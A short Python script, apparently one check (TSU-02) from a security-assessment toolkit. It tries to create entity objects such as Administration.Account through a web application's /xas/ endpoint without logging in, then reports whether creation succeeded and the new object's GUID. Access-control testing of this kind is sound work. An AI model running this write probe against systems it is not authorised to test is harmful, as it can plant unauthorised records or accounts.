#!/usr/bin/env python3
"""
Attempt to create an entity object without authentication via /xas/.
TSU-02

Usage: python write_entity_data.py <url> <entity_type>
  entity_type example: Administration.Account
Output: JSON to stdout
"""
import json
import sys
import requests


def write_entity_data(url: str, entity_type: str) -> dict:
    xas = url.rstrip("/") + "/xas/"
    payload = {
        "action": "create",
        "params": {
            "objectType": entity_type,
            "val": [],
        },
    }
    try:
        resp = requests.post(xas, json=payload, timeout=5)
    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
        return {"entity_type": entity_type, "created": None, "status_code": None, "error": str(e)}

    created = resp.ok
    result = {
        "entity_type": entity_type,
        "created": created,
        "status_code": resp.status_code,
        "error": None,
    }

    if created:
        try:
            data = resp.json()
            # Extract the GUID of the created object if present
            result["created_guid"] = data.get("guid") or data.get("objectGuid")
        except ValueError:
            pass

    return result


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(json.dumps({"error": "usage: write_entity_data.py <url> <entity_type>"}))
        sys.exit(1)
    print(json.dumps(write_entity_data(sys.argv[1], sys.argv[2]), indent=2))
